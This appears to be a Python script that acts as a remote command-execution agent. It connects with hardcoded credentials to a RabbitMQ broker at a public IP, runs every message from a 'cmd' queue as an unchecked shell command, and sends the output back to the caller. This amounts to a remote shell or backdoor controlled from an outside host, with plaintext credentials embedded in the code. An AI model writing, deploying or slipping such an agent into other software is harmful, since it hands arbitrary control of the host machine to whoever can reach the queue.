import pika
import subprocess

auth = pika.credentials.PlainCredentials(username='Lotus', password='Ching')
connection = pika.BlockingConnection(pika.ConnectionParameters(
            host='120.24.80.34',
            port=80,
            credentials=auth))

channel = connection.channel()
channel.queue_declare(queue='cmd')


def callback(ch, method, properties, body):
    print(body.decode())
    data, err = subprocess.Popen(body, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
    ch.basic_publish(exchange='',
                     routing_key=properties.reply_to,
                     body=str(data)
                     )
    ch.basic_ack(delivery_tag=method.delivery_tag)
    print('Response commands result to Queue.')

channel.basic_qos(prefetch_count=1)
channel.basic_consume(callback, queue='cmd')

print(' [*] Waiting for messages. To exit press CTRL+C')
channel.start_consuming()
